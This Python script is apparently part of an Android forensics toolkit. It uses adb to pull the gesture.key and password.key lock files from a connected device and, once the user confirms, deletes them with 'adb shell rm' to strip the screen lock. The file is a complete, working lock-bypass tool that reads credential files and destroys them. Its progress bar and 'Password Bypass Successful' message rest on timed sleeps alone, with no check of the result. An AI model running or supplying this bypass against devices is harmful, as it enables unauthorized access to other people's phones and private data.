import os
from colorama import Fore
from colorama import Style
import time
from tqdm import tqdm
from PyInquirer import prompt
from PyInquirer import Separator


class PBypass:

    def P_Bypass():

        os.system('clear')
        if os.path.isfile("/home/nevin/Desktop/Analysis_Folder/Password_Bypass/gesture.key"):
            os.remove("/home/nevin/Desktop/Analysis_Folder/Password_Bypass/gesture.key")
        if os.path.isfile("/home/nevin/Desktop/Analysis_Folder/Password_Bypass/password.key"):
            os.remove(
                "/home/nevin/Desktop/Analysis_Folder/Password_Bypass/password.key")

        print(Fore.YELLOW+"Android Device Password Bypass"+Fore.RESET)
        print("______________________________________________________\n")

        time.sleep(1)
        print(Fore.YELLOW+"Detecting any security locks on device"+Fore.RESET)

        print("\n")

        time.sleep(1)

        os.system("adb -d pull /data/system/gesture.key ~/Desktop/Analysis_Folder/Password_Bypass  >/dev/null 2>&1;adb -d pull /data/system/password.key ~/Desktop/Analysis_Folder/Password_Bypass  >/dev/null 2>&1;")

        if (os.path.isfile("/home/nevin/Desktop/Analysis_Folder/Password_Bypass/gesture.key")) or (os.path.isfile("/home/nevin/Desktop/Analysis_Folder/Password_Bypass/password.key")):
            print(Fore.RED+"This device is password protected"+Fore.RESET)

            questions = [{
                'type': 'list',
                'name': 'bypass_select',
                'message': 'Do you want to bypass the password?',
                'choices': [
                    Separator(),

                    'Yes',
                    'No',

                ]
            }]
            print(Fore.YELLOW+"")
            answers = prompt(questions)
            print(Fore.RESET+"")

            if answers == {'bypass_select': 'Yes'}:
                os.system(
                    "adb shell rm\ /data/system/password.key >/dev/null 2>&1;adb shell rm\ /data/system/gesture.key >/dev/null 2>&1")
                print(Style.BRIGHT+Fore.GREEN +
                      "The Device Password is being bypassed--------------------------"+Style.NORMAL+Fore.RESET)
                for i in tqdm(range(3)):
                    time.sleep(2)

                print("\n")
                print(Style.BRIGHT+Fore.GREEN +
                      "Password Bypass Successful!!!"+Style.NORMAL+Fore.RESET)

            elif answers == {'bypass_select': 'No'}:
                time.sleep(1)
                print(Style.BRIGHT+"Returning to the Home Screen"+Style.NORMAL)

        else:
            print(Fore.GREEN+"This device is not password protected"+Fore.RESET)

        print("\n")
        #os.system("adb shell rm\ /data/system/password.key >/dev/null 2>&1;adb shell rm\ /data/system/gesture.key >/dev/null 2>&1")


PBypass.P_Bypass()
